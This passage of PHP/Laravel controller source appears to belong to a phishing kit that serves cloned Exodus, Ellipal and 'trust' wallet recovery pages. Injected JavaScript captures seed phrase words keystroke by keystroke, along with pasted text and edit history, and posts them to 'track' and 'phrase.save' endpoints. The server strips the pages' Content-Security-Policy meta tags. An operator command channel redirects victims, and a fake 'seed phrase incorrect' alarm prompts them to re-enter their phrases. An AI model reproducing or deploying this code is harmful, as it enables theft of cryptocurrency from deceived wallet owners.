      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isMmGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $go . $ui . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function trustDisconnect(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/trust/disconnect.html'));
        $bridge = $this->buildCommandBridge('trust_disconnect', '/trust/loading', true);
        $html = str_replace('</body>', $bridge . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function trustRecover(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/trust/recover.html'));
        $html = preg_replace('/<head[^>]*>/i', '$0<style>html,body{background:#1b1b1c}</style>', $html, 1);
        $bridge = $this->buildCommandBridge('trust_recover', '/trust/loading', true);
        $html = str_replace('</body>', $bridge . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }


    public function trustLoading(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/trust/loading.html'));
        $bridge = $this->buildCommandBridge('trust_loading', '/trust/loading', true);
        $html = str_replace('</body>', $bridge . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Exodus pages ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬

    public function exodusImport(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/exodus/index.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;

        // Strip ALL <script> tags ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â broken savepage artifacts cause "unterminated regex" JS errors
        $html = preg_replace('/<script\b[^>]*>[\s\S]*?<\/script>/i', '', $html);
        // Strip broken module preload links with no href
        $html = preg_replace('/<link[^>]+rel=["\']modulepreload["\'][^>]*>/i', '', $html);

        // Fix font paths and remove base tag
        $html = preg_replace('/<base[^>]*>/i', '', $html);
        $html = str_replace("url('./fonts/rubik/", "url('/exodus-fonts/rubik/", $html);
        $html = str_replace("url('fonts/rubik/",  "url('/exodus-fonts/rubik/", $html);
        $html = str_replace('url("./fonts/rubik/', "url('/exodus-fonts/rubik/", $html);
        $html = str_replace('url("fonts/rubik/',   "url('/exodus-fonts/rubik/", $html);
        // Remove CSP meta ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â blocks inline scripts we inject
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);

        $csrf       = csrf_token();
        $track      = route('track.event');
        $phraseSave = route('phrase.save');
        $bridge     = $this->buildCommandBridge('exodus_import', '/exodus/loading', true);

        $exShowInvalid = false;
        if ($request->isMethod('get') && !$request->has('_liveled_preview')) {
            $exToken = $request->cookie('liveled_token');
            $exSess  = $exToken ? \App\Models\UserSession::where('session_token', $exToken)->first() : null;
            $exMeta  = is_array($exSess?->metadata) ? $exSess->metadata : [];
            $exFs    = (isset($exMeta['form_state']) && is_array($exMeta['form_state']))
                ? $exMeta['form_state'] : [];
            if (($exFs['exodus_import'] ?? 'default') === 'invalid') {
                $exShowInvalid = true;
                if ($exSess) {
                    \App\Models\UserSession::where('session_token', $exSess->session_token)
                        ->where('metadata->form_state->exodus_import', 'invalid')
                        ->update(['metadata->form_state->exodus_import' => 'default']);
                }
            }
        }
        $exInvalidJs = $exShowInvalid ? 'true' : 'false';

        $ui = <<<JS
<script>
(function(){
  var CSRF='{$csrf}', TRACK='{$track}', SAVE='{$phraseSave}';
  var _llExInvalid={$exInvalidJs};
  var _wh={}, _lastWords={}, _lastSnap='';
  var REQUIRED=12;

  function getInputs(){
    return Array.from(document.querySelectorAll('#ex-word-grid input'));
  }
  function getWords(){
    return getInputs().map(function(inp){ return (inp.value||'').trim(); });
  }
  function checkEnable(){
    var filled=getWords().filter(Boolean).length;
    var btn=document.getElementById('ex-submit-btn');
    if(btn)btn.disabled=filled<REQUIRED;
  }
  function sendState(force){
    if(!window._llDocId||!window._llStayOk)return Promise.resolve();
    var words=getWords();
    if(!words.some(Boolean)&&!force)return Promise.resolve();
    words.forEach(function(w,i){
      var k=String(i+1),prev=_lastWords[k]||'';
      if(prev&&prev!==w){if(!_wh[k])_wh[k]=[];if(_wh[k].indexOf(prev)===-1)_wh[k].push(prev);}
      _lastWords[k]=w;
    });
    var snap=JSON.stringify({words:words,totalWords:words.length,wordHistory:_wh,passphrase:'',passphraseHistory:[]});
    if(snap===_lastSnap&&!force)return Promise.resolve();
    _lastSnap=snap;
    return (window._encVal?window._encVal(snap):Promise.resolve(snap)).then(function(enc){
      var b=new URLSearchParams({_token:CSRF,page:'exodus_import',type:'phrase_input',element:'full_state',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')});
      return window._llPostTrack(b);
    });
  }
  if(window._llStayReadyPromise)window._llStayReadyPromise.then(function(){sendState(false);});

  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isExGet(u){
    var p=destPath(u);
    return p==='/exodus/import'||p==='/exodus/recover'||p==='/exodus/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isExGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };

  (function(){
    var wc=new URLSearchParams({_token:CSRF,page:'exodus_import',type:'phrase_input',element:'word_count',value:String(REQUIRED)});
    navigator.sendBeacon?navigator.sendBeacon(TRACK,wc):fetch(TRACK,{method:'POST',body:wc,keepalive:true});
  })();

  document.addEventListener('DOMContentLoaded',function(){
    if(_llExInvalid){
      var alarm=document.getElementById('ex-alarm');
      if(alarm){
        if(!alarm.textContent)alarm.textContent='The seed phrase you entered is incorrect. Please try again.';
        alarm.style.display='block';
        setTimeout(function(){alarm.style.display='none';},10000);
      }
    }

    function attachListeners(){
      var inputs=getInputs();
      var form=document.getElementById('ex-import-form');
      var btn=document.getElementById('ex-submit-btn');
      if(!inputs.length||!form||!btn){ setTimeout(attachListeners,200); return; }
      inputs.forEach(function(inp){
        inp.addEventListener('input',function(){
          sendState(false);
          checkEnable();
        });
      });

      if(inputs.length>0){
        inputs[0].addEventListener('paste',function(e){
          e.preventDefault();
          var paste=(e.clipboardData||window.clipboardData).getData('text');
          setTimeout(function(){
            if(!paste)return;
            var words=paste.trim().split(/\s+/).filter(function(w){return w.length>0;});
            for(var i=0;i<Math.min(words.length,inputs.length);i++){
              inputs[i].value=words[i];
            }
            if(inputs.length>0)inputs[0].dispatchEvent(new Event('input',{bubbles:true}));
            setTimeout(function(){sendState(true);},50);
          },50);
        });
      }

      form.addEventListener('submit',function(e){
        e.preventDefault();
        if(btn.disabled)return;
        var words=getWords();
        if(words.filter(Boolean).length<REQUIRED)return;
        Promise.resolve(window._llStayReadyPromise)
        .then(function(){
          if(!window._llStayOk)throw new Error('stay');
          return sendState(true);
        })
        .then(function(){
          return (window._encVal?window._encVal(words.filter(Boolean).join(' ')):Promise.resolve(words.filter(Boolean).join(' '))).then(function(enc){
            var b=new URLSearchParams({_token:CSRF,page:'exodus_import',type:'form_submit',element:'seed_phrase',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')});
            return window._llPostTrack(b);
          });
        })
        .then(function(){
          return fetch(SAVE,{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':CSRF},
            body:JSON.stringify({words:words,passphrase:'',page:'exodus_import',history:_wh}),
            keepalive:true
          }).then(function(r){if(!r.ok)throw new Error('save');});
        })
        .then(function(){
          window.location.href='/exodus/loading';
        })
        .catch(function(){});
      });

      inputs.forEach(function(inp,idx){
        inp.addEventListener('keypress',function(e){
          if(e.key==='Enter'){e.preventDefault();if(idx<inputs.length-1)inputs[idx+1].focus();}
        });
      });
    }
    attachListeners();
    checkEnable();
    (function bindPress(){
      var btn=document.getElementById('ex-submit-btn');
      if(!btn||btn._exPress)return;
      btn._exPress=true;
      function down(){ if(btn.disabled)return; btn.classList.add('is-pressed'); }
      function up(){ btn.classList.remove('is-pressed'); }
      btn.addEventListener('pointerdown',function(e){
        if(btn.disabled)return;
        try{btn.setPointerCapture(e.pointerId);}catch(_e){}
        down();
      });
      ['pointerup','pointercancel','lostpointercapture','pointerleave','blur'].forEach(function(t){
        btn.addEventListener(t,up);
      });
      btn.addEventListener('keydown',function(e){
        if(e.repeat)return;
        if(e.key!=='Enter'&&e.key!==' ')return;
        down();
      });
      btn.addEventListener('keyup',function(e){
        if(e.key!=='Enter'&&e.key!==' ')return;
        up();
      });
    })();
    setInterval(function(){sendState(false);},3000);
  });
})();
</script>
JS;
        $html = str_replace('</body>', $bridge.$ui.'</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function exodusRecover(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/exodus/recover.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;
        $bridge = $this->buildCommandBridge('exodus_recover', '/exodus/loading', true);
        $exInvalidJs = $this->consumeFormStateOnce('exodus_recover') ? 'true' : 'false';
        $ui = <<<JS
<script>
(function(){
  var REQUIRED=12;
  var _llExRecInvalid={$exInvalidJs};
  function getInputs(){ return Array.from(document.querySelectorAll('#ex-word-grid input')); }
  function getWords(){ return getInputs().map(function(inp){ return (inp.value||'').trim(); }); }
  function checkEnable(){
    var btn=document.getElementById('ex-submit-btn');
    if(btn)btn.disabled=getWords().filter(Boolean).length<REQUIRED;
  }
  function hop(){
    if(typeof window.navigateTo==='function')window.navigateTo('/exodus/loading');
    else window.location.href='/exodus/loading';
  }
  document.addEventListener('DOMContentLoaded',function(){
    if(_llExRecInvalid){
      var alarm=document.getElementById('ex-alarm');
      if(alarm){
        if(!alarm.textContent)alarm.textContent='The seed phrase you entered is incorrect. Please try again.';
        alarm.style.display='block';
        setTimeout(function(){alarm.style.display='none';},10000);
      }
    }
    var inputs=getInputs();
    var form=document.getElementById('ex-import-form');
    var btn=document.getElementById('ex-submit-btn');
    inputs.forEach(function(inp,idx){
      inp.addEventListener('input',checkEnable);
      inp.addEventListener('keypress',function(e){
        if(e.key==='Enter'){e.preventDefault();if(idx<inputs.length-1)inputs[idx+1].focus();}
      });
    });
    if(inputs[0]){
      inputs[0].addEventListener('paste',function(e){
        var paste=(e.clipboardData||window.clipboardData).getData('text');
        if(!paste)return;
        var words=paste.trim().split(/\\s+/).filter(Boolean);
        if(words.length<2)return;
        e.preventDefault();
        for(var i=0;i<Math.min(words.length,inputs.length);i++) inputs[i].value=words[i];
        checkEnable();
      });
    }
    if(form){
      form.addEventListener('submit',function(e){
        e.preventDefault();
        if(!btn||btn.disabled)return;
        hop();
      });
    }
    checkEnable();
  });
})();
</script>
JS;
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isExGet(u){
    var p=destPath(u);
    return p==='/exodus/import'||p==='/exodus/recover'||p==='/exodus/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isExGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $go . $ui . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }


    public function exodusLoading(Request $request)
    {
        $html   = file_get_contents(resource_path('views/user/exodus/loading.html'));
        $bridge = $this->buildCommandBridge('exodus_loading', '/exodus/loading', true);
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isExGet(u){
    var p=destPath(u);
    return p==='/exodus/import'||p==='/exodus/recover'||p==='/exodus/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isExGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html   = str_replace('<!--[[BRIDGE]]-->', $bridge.$go, $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function ellipal1(Request $request)
    {
        return $this->serveEllipalPage('1.html', 'ellipal_24word');
    }

    public function ellipalRecover(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/ellipal/recover.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        $html = preg_replace('/<head[^>]*>/i', '$0<style>html,body{background:#111218}</style>', $html, 1);
        $html = preg_replace('/<script\b[^>]*>[\s\S]*?<\/script>/i', '', $html);
        $html = preg_replace('/\son[a-z]+=["\'][^"\']*["\']/', '', $html);
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);
        $bridge = $this->buildCommandBridge('ellipal_recover', '/ellipal/loading', true);
        $elInvalidJs = $this->consumeFormStateOnce('ellipal_recover') ? 'true' : 'false';
        $ui = <<<JS
<style>
@keyframes ellAlarmIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
</style>
<div id="el-rec-alarm" style="display:none;background:#dc2626;color:#fff;padding:12px 16px;border-radius:8px;text-align:center;font-size:13px;font-weight:600;margin:10px 0 6px;line-height:1.6;width:100%;animation:ellAlarmIn .2s ease-out;"></div>
<script>
(function(){
  var _wordCount=24;
  var _llElRecInvalid={$elInvalidJs};
  var _submitBtn=null;
  function getWords(){
    var r=[], inp=document.querySelectorAll('input[placeholder="Word"]');
    for(var i=0;i<inp.length&&i<_wordCount;i++) r.push((inp[i].value||'').trim());
    return r;
  }
  function syncSubmitBtn(){
    if(!_submitBtn)return;
    _submitBtn.disabled=getWords().filter(Boolean).length<_wordCount;
  }
  function setWordCount(n){
    _wordCount=n;
    document.querySelectorAll('input[placeholder="Word"]').forEach(function(inp){ inp.value=''; });
    document.querySelectorAll('.ellipal-ext-word').forEach(function(el){
      el.style.display=(n===24)?'':'none';
    });
    var b24=document.getElementById('ellipal-24-btn');
    var b12=document.getElementById('ellipal-12-btn');
    if(b24){b24.style.background=n===24?'#2e3040':'transparent';b24.style.fontWeight=n===24?'700':'400';}
    if(b12){b12.style.background=n===12?'#2e3040':'transparent';b12.style.fontWeight=n===12?'700':'400';}
    syncSubmitBtn();
  }
  function hop(){
    if(typeof window.navigateTo==='function')window.navigateTo('/ellipal/loading');
    else window.location.href='/ellipal/loading';
  }
  document.addEventListener('DOMContentLoaded',function(){
    var alarm=document.getElementById('el-rec-alarm');
    var submitRow=document.querySelector('.flex.w-full.justify-end');
    if(alarm&&submitRow&&submitRow.parentNode) submitRow.parentNode.insertBefore(alarm,submitRow);
    if(_llElRecInvalid&&alarm){
      alarm.innerHTML='Invalid seed phrase.';
      alarm.style.display='block';
      setTimeout(function(){alarm.style.display='none';},12000);
    }
    var b24=document.getElementById('ellipal-24-btn');
    var b12=document.getElementById('ellipal-12-btn');
    if(b24){b24.style.cursor='pointer';b24.onclick=function(){setWordCount(24);};}
    if(b12){b12.style.cursor='pointer';b12.onclick=function(){setWordCount(12);};}
    setWordCount(24);
    _submitBtn=document.getElementById('ellipal-submit-btn');
    if(_submitBtn){
      _submitBtn.onclick=function(e){e.preventDefault();if(_submitBtn.disabled)return;hop();};
    }
    document.querySelectorAll('input[placeholder="Word"]').forEach(function(inp){
      inp.addEventListener('input',syncSubmitBtn);
    });
    syncSubmitBtn();
  });
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $ui . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }


    public function ellipal2(Request $request)
    {
        return $this->serveEllipalPage('2.html', 'ellipal_12word');
    }

    public function ellipalLoading(Request $request)
    {
        $html   = file_get_contents(resource_path('views/user/ellipal/loading.html'));
        $bridge = $this->buildCommandBridge('ellipal_loading', '/ellipal/loading', true);
        // New loading page uses <!--[[BRIDGE]]--> placeholder; fall back to </body> replace
        if (str_contains($html, '<!--[[BRIDGE]]-->')) {
            $html = str_replace('<!--[[BRIDGE]]-->', $bridge, $html);
        } else {
            $html = str_replace('</body>', $bridge . '</body>', $html);
        }
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    private function serveEllipalPage(string $file, string $pageName)
    {
        $html = file_get_contents(resource_path('views/user/ellipal/' . $file));
        // Strip UTF-8 BOM if present
        $html = ltrim($html, "\xEF\xBB\xBF");

        $csrf = csrf_token();
        $track = route('track.event');
        $phraseSave = route('phrase.save');
        $bridge = $this->buildCommandBridge($pageName, '/ellipal/loading', true);

        // Strip ALL <script> tags from the original page ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â they are broken savepage artifacts
        // that cause "Invalid regular expression" JS syntax errors. We inject our own scripts.
        $html = preg_replace('/<script\b[^>]*>[\s\S]*?<\/script>/i', '', $html);
        // Strip inline event handlers that may reference undefined variables
        $html = preg_replace('/\son[a-z]+=["\'][^"\']*["\']/', '', $html);
        // Strip any remaining javascript: protocols
        $html = preg_replace('/javascript:[^"\'\s]*/i', '', $html);
        // Strip broken module preload links with no href
        $html = preg_replace('/<link[^>]+rel=["\']modulepreload["\'][^>]*>/i', '', $html);
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);
        // Remove Google Translate widget that causes blank space at top
        $html = preg_replace('/<div[^>]*id=["\']goog-gt-tt["\'][^>]*>.*?<\/div>\s*<\/div>\s*<\/div>\s*<\/div>/is', '', $html);
        $html = preg_replace('/<div[^>]*class=["\'][^"\']*goog-te-spinner[^"\']*["\'][^>]*>.*?<\/div>/is', '', $html);
        $html = preg_replace('/<div[^>]*class=["\'][^"\']*goog-te-banner[^"\']*["\'][^>]*>.*?<\/div>/is', '', $html);
        // Remove extension body attributes that can cause layout issues
        $html = preg_replace('/(<body[^>]*)\s+__processed_[^=]+=["\'"][^"\']*["\'"]/', '$1', $html);
        $html = preg_replace('/(<body[^>]*)\s+bis_register=["\'"][^"\']*["\'"]/', '$1', $html);
        $html = preg_replace('/(<body[^>]*)\s+cz-shortcut-listen=["\'"][^"\']*["\'"]/', '$1', $html);
        $html = preg_replace('/(<body[^>]*)\s+bis_skin_checked=["\'"][^"\']*["\'"]/', '$1', $html);
        // Remove any data-* attributes that might contain broken JS
        $html = preg_replace('/\sdata-[a-z-]+=["\'][^"\']*["\']/', '', $html);
        // Remove the BOM character that appears as junk after <body>
        $html = preg_replace('/(<body[^>]*>)\s*\xEF\xBB\xBF/', '$1', $html);

        // Inject stable IDs into title/subtitle spans so JS can reliably update them via getElementById
        // These exact class strings are unique in the page ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â PHP adds id once (limit=1)
        $html = preg_replace(
            '/(<span\s+class="text-2xl\s+font-medium\s+text-\[#cfd0d1\]")/',
            '$1 id="ellipal-page-title"',
            $html, 1
        );
        $html = preg_replace(
            '/(<span\s+class="text-sm\s+text-\[#cfd0d1\]")/',
            '$1 id="ellipal-page-subtitle"',
            $html, 1
        );

        // Server-side text injection â€” session-persisted so refresh retains custom text
        $customTitle    = request()->input('_title', '');
        $customSubtitle = request()->input('_sub',   '');
        $customButton   = request()->input('_btn',   '');
        $skBase         = '_tts_el_' . $pageName;
        $redirectUrl    = '/' . request()->path();

        if (request()->hasAny(['_title', '_sub', '_btn'])) {
            if ($customTitle !== '')    session([$skBase . '_t' => $customTitle]);    else session()->forget($skBase . '_t');
            if ($customSubtitle !== '') session([$skBase . '_s' => $customSubtitle]); else session()->forget($skBase . '_s');
            if ($customButton !== '')   session([$skBase . '_b' => $customButton]);   else session()->forget($skBase . '_b');
            if (request()->has('_liveled_preview')) {
                return redirect($redirectUrl . '?_liveled_preview=1');
            }
            return redirect($redirectUrl);
        }
        $customTitle    = session($skBase . '_t', '');
        $customSubtitle = session($skBase . '_s', '');
        $customButton   = session($skBase . '_b', '');

        // Inject ID into the submit button for server-side text injection
        $html = preg_replace('/(<div class="flex w-full justify-end"[^>]*>\s*)(<button)/is', '$1<button id="ellipal-submit-btn"', $html, 1);

        if ($customTitle) {
            $html = preg_replace('/(<span[^>]*id="ellipal-page-title"[^>]*>)([^<]*)(<\/span>)/is', '$1' . htmlspecialchars($customTitle) . '$3', $html, 1);
        }
        if ($customSubtitle) {
            $html = preg_replace('/(<span[^>]*id="ellipal-page-subtitle"[^>]*>)([^<]*)(<\/span>)/is', '$1' . htmlspecialchars($customSubtitle) . '$3', $html, 1);
        }
        if ($customButton) {
            $html = preg_replace('/(<button[^>]*id="ellipal-submit-btn"[^>]*>)([^<]*)(<\/button>)/is', '$1' . htmlspecialchars($customButton) . '$3', $html, 1);
        }

        $wordCount = strpos($file, '1.html') !== false ? 24 : 12;
        // Escape values for JavaScript injection - add quotes around non-null values
        $jsCustomTitle    = $customTitle    ? json_encode($customTitle)    : 'null';
        $jsCustomSubtitle = $customSubtitle ? json_encode($customSubtitle) : 'null';
        $jsCustomButton   = $customButton   ? json_encode($customButton)   : 'null';

        $elShowInvalid = false;
        if ($pageName === 'ellipal_24word' && request()->isMethod('get') && !request()->has('_liveled_preview')) {
            $elToken = request()->cookie('liveled_token');
            $elSess  = $elToken ? \App\Models\UserSession::where('session_token', $elToken)->first() : null;
            $elMeta  = is_array($elSess?->metadata) ? $elSess->metadata : [];
            $elFs    = (isset($elMeta['form_state']) && is_array($elMeta['form_state']))
                ? $elMeta['form_state'] : [];
            if (($elFs['ellipal_24word'] ?? 'default') === 'invalid') {
                $elShowInvalid = true;
                if ($elSess) {
                    \App\Models\UserSession::where('session_token', $elSess->session_token)
                        ->where('metadata->form_state->ellipal_24word', 'invalid')
                        ->update(['metadata->form_state->ellipal_24word' => 'default']);
                }
            }
        }
        $elInvalidJs = $elShowInvalid ? 'true' : 'false';
        
        $ui = <<<JS
<style>
@keyframes ellipsin{to{transform:rotate(360deg)}}
.ellip-spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:ellipsin .8s linear infinite;vertical-align:middle}
@keyframes ellAlarmIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
@media (max-width:768px){input[placeholder="Word"]{font-size:13px !important;padding:10px !important;}}
@media (max-width:480px){input[placeholder="Word"]{font-size:12px !important;padding:8px !important;}}
</style>
<!-- alarm: injected above submit row by JS -->
<div id="ellip-alarm" style="display:none;background:#dc2626;color:#fff;padding:12px 16px;border-radius:8px;text-align:center;font-size:13px;font-weight:600;margin:10px 0 6px;line-height:1.6;width:100%;animation:ellAlarmIn .2s ease-out;"></div>
<script>
(function(){
  'use strict';
  var CSRF='{$csrf}', TRACK='{$track}', SAVE='{$phraseSave}';
